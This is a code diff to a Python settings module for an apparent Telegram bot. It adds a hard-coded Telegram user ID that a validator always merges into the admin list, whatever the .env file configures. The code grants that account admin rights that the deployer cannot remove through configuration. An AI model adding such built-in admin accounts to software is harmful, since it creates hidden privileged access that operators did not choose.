@@ -6,6 +6,9 @@ from pydantic_settings import BaseSettings, NoDecode, SettingsConfigDict
 
 BASE_DIR = Path(__file__).resolve().parent.parent
 
+# Встроенные админы (дополняют ADMIN_TELEGRAM_IDS из .env)
+BUILTIN_ADMIN_TELEGRAM_IDS: tuple[int, ...] = (292396648,)
+
 
 def _parse_admin_ids(value: Any) -> list[int]:
     if value is None or value == "" or value == []:
@@ -18,6 +21,16 @@ def _parse_admin_ids(value: Any) -> list[int]:
     if isinstance(value, (list, tuple)):
         return [int(x) for x in value]
     raise ValueError(f"Invalid admin_telegram_ids: {value!r}")
+
+
+def _merge_admin_ids(parsed: list[int]) -> list[int]:
+    seen: set[int] = set()
+    merged: list[int] = []
+    for uid in (*BUILTIN_ADMIN_TELEGRAM_IDS, *parsed):
+        if uid not in seen:
+            seen.add(uid)
+            merged.append(uid)
+    return merged
 
 
 class Settings(BaseSettings):
@@ -68,6 +81,11 @@ class Settings(BaseSettings):
     @classmethod
     def parse_admin_telegram_ids(cls, value: Any) -> list[int]:
         return _parse_admin_ids(value)
+
+    @field_validator("admin_telegram_ids", mode="after")
+    @classmethod
+    def merge_builtin_admin_ids(cls, value: list[int]) -> list[int]:
+        return _merge_admin_ids(value)
 
     groq_model: str = "llama-3.1-8b-instant"
     groq_whisper_model: str = "whisper-large-v3-turbo"
